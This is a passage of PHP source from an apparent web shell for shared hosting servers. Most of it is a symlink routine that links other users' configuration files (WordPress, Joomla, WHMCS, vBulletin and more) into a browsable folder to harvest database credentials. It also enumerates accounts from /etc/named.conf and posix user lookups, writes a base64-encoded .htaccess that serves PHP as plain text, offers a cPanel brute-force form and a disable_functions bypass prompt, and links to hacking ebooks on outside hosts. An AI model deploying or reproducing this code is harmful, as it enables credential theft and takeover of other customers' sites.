                    symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                    symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                    symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                    symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                    symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                    symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                    symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                    symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                    symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                    symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                    symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                    symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                    symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                    symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                    symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                    symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                    symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                    symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                    symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                    symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                    symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                    symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                    symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                    symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                    symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                    symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                    symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                    symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                    symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                    symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                    symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                    symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                    symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                    symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                    symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                    symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                    symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                    symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                    symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                    symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                    symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                    symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                    symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                    symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                    symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                    symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                    symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                    symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                    symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                    symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                    symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                    symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                    symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                    symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                    symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                    symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                    symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                    symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                    symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                    symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                    symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                    symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                    symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                    symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                    symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                    symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                    symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                    symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                    symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                    symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                    symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                    symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                    symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                    symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                    symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                    symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                    symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                    symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                    symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                    symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                    symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                    symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                    symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                    symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                    symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                    symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                    symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                    symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                    symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                    symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                    symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                    symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                    symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                    symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                    symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                    symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                    symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                    symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                    symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                    symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                    symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                    symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                }

                $d0mains = @file("/etc/named.conf");

                if($d0mains)
                {
                    mkdir($fn);
                    chdir($fn);

                    foreach($d0mains as $d0main)
                    {
                        if(eregi("zone",$d0main))
                        {
                            preg_match_all('#zone "(.*)"#', $d0main, $domains);
                            flush();

                            if(strlen(trim($domains[1][0])) > 2)
                            {
                                $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

                                syml($user['name'],$domains[1][0]);
                            }
                        }
                    }
                    echo "<center><font color=lime size=3>[ Done ]</font></center>";
                    echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>";
                }
                else
                {
                    mkdir($fn);
                    chdir($fn);
                    $temp = "";
                    $val1 = 0;
                    $val2 = 1000;
                    for(;$val1 <= $val2;$val1++)
                    {
                        $uid = @posix_getpwuid($val1);
                        if ($uid)
                            $temp .= join(':',$uid)."\n";
                    }
                    echo '<br/>';
                    $temp = trim($temp);

                    $file5 = fopen("test.txt","w");
                    fputs($file5,$temp);
                    fclose($file5);

                    $htaccess =
                        'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
                    $file = fopen(".htaccess","w+");
                    $write = fwrite ($file ,base64_decode($htaccess));

                    $file = fopen("test.txt", "r") or exit("Unable to open file!");
                    while(!feof($file))
                    {
                        $s = fgets($file);
                        $matches = array();
                        $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                        $matches = str_replace("home/","",$matches[1]);
                        if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
                            continue;
                        syml($matches,$matches);
                    }
                    fclose($file);
                    echo "</table>";
                    unlink("test.txt");
                    echo "<center><font color=lime size=3>[ Done ]</font></center>";
                    echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>";
                }
                echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
                exit;
            }
            ?>
            <form method="POST" target="_blank">
                <strong>
                    <input name="page" type="hidden" value="find"><table>
                </strong><br><br><center><font size="5" style="italic" color="#00ff00">=[ Cpanel BruteForce ]=</font></center><br><br>
                <table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
                    <tr>
                        <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
                            <center><b><font size="5" style="italic" color="#00ff00">Cpanel BruteForce</font></b></center></td></tr>
                    <tr>
                        <td>
                            <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
                                <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
                                    <strong>User :</strong></td>
                                <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong></td>
                                </tr>
                                <tr>
                                    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
                                        <strong>Pass :</strong></td>
                                    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords"></textarea></strong></td>
                                </tr>
                                <tr>
                                    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
                                        <strong>Type :</strong></td>
                                    <td valign="top" bgcolor="#151515" colspan="5">
                                        <span class="style2"><strong>Simple : </strong> </span>
                                        <strong>
                                            <input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
                                        <font class="style2"><strong>/etc/passwd : </strong> </font>
                                        <strong>
                                            <input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
                                            </strong>
	</span>
                                    </td>
                                </tr>
                                <tr>
                                    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
                                    <td valign="top" bgcolor="#151515"  colspan="5"><strong><input class ='inputzbut' type="submit" value="start">
                                        </strong>
                                    </td>
                                <tr>
            </form>
            <tr>
                <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Config :</strong></td>
            </tr>
            <form method="POST" target="_blank">
                <strong>
                    <input name="mendapatkan" type="hidden" value="passwd">
                </strong>
                <tr>
                    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Folder Name :</strong></td>
                    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="foldername" type="text"></strong></td>
                    </strong>
                    </td>
                </tr>
                <tr>
                    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
                    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
                        </strong>
                    </td>
                <tr>
            </form>
            <tr>
                <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Wordlist</strong></td>
            </tr>
            <form method="POST" target="_blank">
                <strong>
                    <input name="pass" type="hidden" value="password">
                </strong>
                <tr>
                    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Url Config :</strong></td>
                    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="url" type="text"></strong></td>
                    </strong>
                    </td>
                </tr>
                <tr>
                    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
                    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
                        </strong>
                    </td>
                <tr>
            </form>
            <tr>
                <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Info
                        Security</strong></td>
            </tr>
            <tr>
                <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
                <td valign="top" bgcolor="#151515" colspan="5">
                    <strong>
                        <?php
                        $safe_mode = ini_get('safe_mode');
                        if($safe_mode=='1')
                        {
                            echo 'ON';
                        }else{
                            echo 'OFF';
                        }

                        ?>
                    </strong>
                </td>
            </tr>
            <tr>
                <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Desible Function</strong></td>
                <td valign="top" bgcolor="#151515" colspan="5">
                    <strong>
                        <form method="POST" target="_blank">
                            <strong>
                                <input name="matikan" type="hidden" value="sekatan">
                            </strong>

                        <?php
                        if(''==($func=@ini_get('disable_functions')))
                        {
                            echo "<font color=#00ff00>No Security for Function</font></b>";
                        }else{
                            echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
                            echo "<font color=red>$func</font></b>";
                            echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
                            echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </strong>
    </td></tr>';
                        }
                        ?></strong></td></tr></table></table></table>
            <?
            }
            ///////////////////////////////////////////////////////////////////////////

            elseif(isset($_GET['x']) && ($_GET['x'] == 'tutor'))
            {
            ?>
            <form action="?y=<?php echo $pwd; ?>&x=tutor" method="post">
                <center><br><br><b>+--=[ Tutorial & Ebook hacking ]=--+</b><br>
                    <form method="post" action="">
                        <table class="tabnet" border="1" >
                            <tr>
                                <td align="center">English</td><td align="center">Indonesian</td>
                            </tr>
                            <tr>
                                <td><form method="post" action="">&nbsp;
                                        E-book Hacking &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
                                        <select class="inputzbut" name="pilih" id="pilih">
                                            <option value=""selected>-----------------[ Select ]-----------------</option>
                                            <option value="tutorial24" > Hacking Exposed-5 </option>
                                            <option value="tutorial25"> Internet Denial Of Service </option>
                                            <option value="tutorial26">Computer Viruses For Dummies</option>
                                            <option value="tutorial27">Hack Attacks Testing</option>
                                            <option value="tutorial28">Secrets Of A Super Hacker</option>
                                            <option value="tutorial29">Stealing The Network</option>
                                            <option value="tutorial30">Hacker's HandBook</option>
                                        </select>
                                        <input  type="submit" name="submit" class="inputzbut" value="Download">
                                </td></form>
                    <td><form method="post" action="">&nbsp;
                            Tutorial by X'1N73CT &nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
                            <select class="inputzbut"  name="pilih" id="pilih">
                                <option value=""selected>-----------------[ Select ]-----------------</option>
                                <option value="tutorial2">Search Engine Hacking</option>
                                <option value="tutorial3">SQL Injection dengan hackbar</option>
                                <option value="tutorial1" >Bypass Union</option>
                            </select>
                            <input  type="submit" name="submit" class="inputzbut" value="Download">
                        </form></td>
                    </tr>
                    <tr>
                        <td>
                            <form method="post" action="">&nbsp;
                                E-Book from Syn|gress &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
                                <select class="inputzbut"  name="pilih" id="pilih">
                                    <option value=""selected>-----------------[ Select ]-----------------</option>
                                    <option value="cryptography_for_defeloper">Cryptography for Developer</option>
                                    <option value="tutorial31">Mobile Malware Attack and Defense</option>
                                    <option value="forensic">CD and DVD Forensic</option>
                                    <option value="ddd">Open Sourch Security Tools</option>
                                    <option value="metasploit">Metaslpoit Toolkit</option>
                                    <option value="stealing_network">Stealing the Network</option>
                                    <option value="security_polices">Creating Security Polices</option>
                                </select>
                                <input  type="submit" name="submit" class="inputzbut" value="Download">
                            </form></td>
                        <td>
                            <form method="post" action="">&nbsp;
                                X-CODE MAGAZINE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
                                <select class="inputzbut" name="pilih" id="pilih">
                                    <option value=""selected>-----------------[ Select ]-----------------</option>
                                    <option value="tutorial4">X-CODE MAGAZINE 1</option>
                                    <option value="tutorial5">X-CODE MAGAZINE 2</option>
                                    <option value="tutorial6">X-CODE MAGAZINE 3</option>
                                    <option value="tutorial7">X-CODE MAGAZINE 4</option>
                                    <option value="tutorial8">X-CODE MAGAZINE 5</option>
                                    <option value="tutorial9">X-CODE MAGAZINE 6</option>
                                    <option value="tutorial10">X-CODE MAGAZINE 7</option>
                                    <option value="tutorial11">X-CODE MAGAZINE 8</option>
                                    <option value="tutorial12">X-CODE MAGAZINE 9</option>
                                    <option value="tutorial13">X-CODE MAGAZINE 10</option>
                                    <option value="tutorial14">X-CODE MAGAZINE 11</option>
                                    <option value="tutorial15">X-CODE MAGAZINE 12</option>
                                    <option value="tutorial16">X-CODE MAGAZINE 13</option>
                                    <option value="tutorial17">X-CODE MAGAZINE 14</option>
                                    <option value="tutorial18">X-CODE MAGAZINE 15</option>
                                    <option value="tutorial19">X-CODE MAGAZINE 16</option>
                                    <option value="tutorial20">X-CODE MAGAZINE 17</option>
                                    <option value="tutorial21">X-CODE MAGAZINE 18</option>
                                    <option value="tutorial22">X-CODE MAGAZINE 19</option>
                                    <option value="tutorial23">X-CODE MAGAZINE 20</option>
                                    <option value="tutorial024">X-CODE MAGAZINE 21</option>
                                </select>
                                <input type="submit" name="submit" class="inputzbut" value="Download" ></a>
                            </form></td></tr></table><br><br>
                    <?php
                    $submit = $_POST ['submit'];
                    if(isset($submit)) {
                        $pilih = $_POST['pilih'];
                        if ( $pilih == 'tutorial1') {
                            ?>
                            <script>
                                document.location = 'http://www.pharmconseil-elearning.com/main/upload/by_passing_illegal_mix_of_collations_for_operation__union__by_x_1n73ct.pdf';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial2') {
                        ?>
                            <script>
                                document.location = 'http://www.pharmconseil-elearning.com/main/upload/Search_engine_hacking_by_x_1n73ct.pdf';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial3') {
                        ?>
                            <script>
                                document.location = 'http://www.pharmconseil-elearning.com/main/upload/Sql_injection_dengan_hackbar.pdf';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial4') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode_magazine_1.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial5') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode_magazine_2.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial6') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode_magazine_3.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial7') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode_magazine_4.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial8') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode_magazine_5.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial9') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode_magazine_6.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial10') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode_magazine_7.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial11') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode_magazine_8.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial12') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode9.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial13') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode10.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial14') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/xcode11.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial15') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/Xcode12.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial16') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/Xcode13.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial17') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/files/Xcode14.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial18') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/Xcode15.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial19') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/xcode_magazine_16.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial20') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/xcode_magazine_17.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial21') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/xcode_magazine_18.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial22') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/xcode_magazine_19.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial23') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/xcode_magazine_20.zip';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial024') {
                        ?>
                            <script>
                                document.location = 'http://xcode.or.id/xcode_magazine_21.zip';
                            </script>
                        <?php
                        }

                        elseif ( $pilih == 'tutorial24') {
                        ?>
                            <script>
                                document.location = 'http://www.insecure.in/ebooks/hacking_exposed_5.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial25') {
                        ?>
                            <script>
                                document.location = 'http://www.insecure.in/ebooks/internet_denial_of_service.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial26') {
                        ?>
                            <script>
                                document.location = 'http://www.insecure.in/ebooks/computer_viruses_for_dummies.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial27') {
                        ?>
                            <script>
                                document.location = 'http://www.insecure.in/ebooks/hack_attacks_testing.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial28') {
                        ?>
                            <script>
                                document.location = 'http://www.insecure.in/ebooks/secrets_of_super_hacker.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial29') {
                        ?>
                            <script>
                                document.location = 'http://www.insecure.in/ebooks/stealing_network_how_to_own_shadow.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial30') {
                        ?>
                            <script>
                                document.location = 'http://www.insecure.in/ebooks/webapp_hackers_handbook.rar';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'ddd') {
                        ?>
                            <script>
                                document.location = 'http://199.91.153.95/t8dni7k639hg/3o321lcwwk8u5bh/Open_Source_Security_Tools.pdf';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'tutorial31') {
                        ?>
                            <script>
                                document.location = 'http://205.196.121.149/sg22hm8qjbhg/afsa7ibbk4ny2kd/Mobile_Malware_Attacks_and_Defense.pdf';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'cryptography_for_defeloper') {
                        ?>
                            <script>
                                document.location = 'http://205.196.121.248/0sod33qw66ug/wypyz555sc9bn7h/Cryptography_for_Developers.pdf';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'forensic') {
                        ?>
                            <script>
                                document.location = 'http://205.196.120.85/uisebgmioyjg/6l70l00ba9yoksq/CD_and_DVD_Forensics.pdf';
                            </script>
                        <?php
                        }
                        elseif ( $pilih == 'metasploit') {
                        ?>
                            <script>
                                document.location = 'http://199.91.153.192/3t115p2f6gvg/zvrrddmq6icqtd2/Metasploit_Toolkit.pdf';
                            </script>
                        <?php
                        }elseif ( $pilih == 'stealing_network') {
                        ?>
                            <script>
                                document.location = 'http://205.196.123.138/wbsxltb8rbtg/5vm8a1d23i9zje3/Stealing_the_Network_-_How_to_Own_the_Box.pdf';
                            </script>
                        <?php
                        }elseif ( $pilih == 'security_polices') {
                        ?>
                            <script>
                                document.location = 'http://199.91.153.73/6le01f562ehg/6l5ep021dhvlhlq/Creating_Security_Policies_and_Implementing_Identity_Management_with_Active_Directory.pdf';
                            </script>
                            <?php
                        }
                    }

                    }
                    ////////////////////////////////////////////////////////////////////

                    //////////////////////////////////////////////////////////////////
                    elseif(isset($_GET['x']) && ($_GET['x'] == 'cms_detect'))
                    {
                    ?>
                    <form action="?y=<?php echo $pwd; ?>&x=cms_detect" method="post">
                        <br><br><br><br><center><b><font size=4>+--=[ CMS Detector ]=--+</font></b></center><br><br>
                        <?php
                        if(!file_exists('pee.tmp')){
                            @fopen('pee.tmp', 'w');

                            echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
                            echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>CMS</b></center></td></table>';

                            $p = 0;

                            if(is_readable("/var/named")){
                                $list = scandir("/var/named");
                                $current_dir = posix_getcwd();
                                $dir = explode("/",$current_dir);
                                foreach($list as $domain){
                                    if(strpos($domain,".db"))
                                    {
                                        $domain = str_replace('.db','',$domain);
                                        $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));

                                        error_reporting(0);

                                        $link = $pageURL.'pee/'.$owner['name'];

                                        cms_add($link,$domain,$owner['name'],"WordPress");
                                        cms_add($link,$domain,$owner['name'],"Joomla");
                                        cms_add($link,$domain,$owner['name'],"vBulletin");
                                        cms_add($link,$domain,$owner['name'],"WHMCS");
                                        cms_add($link,$domain,$owner['name'],"PhpBB");
                                        cms_add($link,$domain,$owner['name'],"MyBB");
                                        cms_add($link,$domain,$owner['name'],"IPB");
                                        cms_add($link,$domain,$owner['name'],"SMF");
                                        cms_add($link,$domain,$owner['name'],"Drupal");
                                        cms_add($link,$domain,$owner['name'],"e107");
                                        cms_add($link,$domain,$owner['name'],"Seditio");
                                        cms_add($link,$domain,$owner['name'],"osCommerce");

                                    }
                                }
                            }
                        }else{
                            echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
